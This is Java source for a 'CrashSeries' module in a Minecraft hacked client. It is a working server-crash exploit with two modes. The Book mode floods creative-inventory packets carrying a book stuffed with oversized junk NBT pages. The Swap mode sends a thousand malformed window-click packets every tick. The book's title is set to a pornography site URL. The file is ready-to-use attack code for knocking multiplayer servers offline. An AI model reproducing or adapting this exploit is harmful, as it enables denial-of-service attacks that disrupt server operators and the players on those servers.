

package me.abHack.features.modules.misc;

import me.abHack.features.modules.*;
import me.abHack.features.setting.*;
import me.abHack.*;
import net.minecraft.init.*;
import net.minecraft.item.*;
import net.minecraft.nbt.*;
import net.minecraft.network.*;
import net.minecraft.util.*;
import net.minecraft.inventory.*;
import net.minecraft.network.play.client.*;

public class CrashSeries extends Module
{
    private final Setting<Mode> mode;
    private final Setting<Boolean> escoff;
    
    public CrashSeries() {
        super("CrashSeries", "crash", Category.MISC, true, false, false);
        this.mode = (Setting<Mode>)this.register(new Setting("Mode", Mode.Swap));
        this.escoff = (Setting<Boolean>)this.register(new Setting("EscOff", true));
    }
    
    @Override
    public void onLogout() {
        if (this.escoff.getValue() && OyVey.moduleManager.isModuleEnabled("CrashSeries")) {
            this.disable();
        }
    }
    
    @Override
    public void onLogin() {
        if (this.escoff.getValue() && OyVey.moduleManager.isModuleEnabled("CrashSeries")) {
            this.disable();
        }
    }
    
    @Override
    public void onTick() {
        if (fullNullCheck()) {
            return;
        }
        if (this.mode.getValue() == Mode.Book) {
            final ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
            final NBTTagList list = new NBTTagList();
            final NBTTagCompound tag = new NBTTagCompound();
            final String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y56h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
            for (int i = 0; i < 50; ++i) {
                final String siteContent = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y56h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                final NBTTagString tString = new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5");
                list.appendTag((NBTBase)tString);
            }
            tag.setString("author", "Gqrl");
            tag.setString("title", "https://www.pornhub.com");
            tag.setTag("pages", (NBTBase)list);
            book.setTagInfo("pages", (NBTBase)list);
            book.setTagCompound(tag);
            for (int i = 0; i < 100 && !CrashSeries.mc.player.isSpectator(); ++i) {
                CrashSeries.mc.getConnection().sendPacket((Packet)new CPacketCreativeInventoryAction(0, book));
            }
        }
        if (this.mode.getValue() == Mode.Swap) {
            for (int j = 0; j < 1000; ++j) {
                final ItemStack item = new ItemStack(CrashSeries.mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
                final CPacketClickWindow packet = new CPacketClickWindow(0, 1000, 1, ClickType.QUICK_MOVE, item, (short)0);
                CrashSeries.mc.player.connection.sendPacket((Packet)packet);
            }
        }
    }
    
    public enum Mode
    {
        Swap, 
        Book;
    }
}
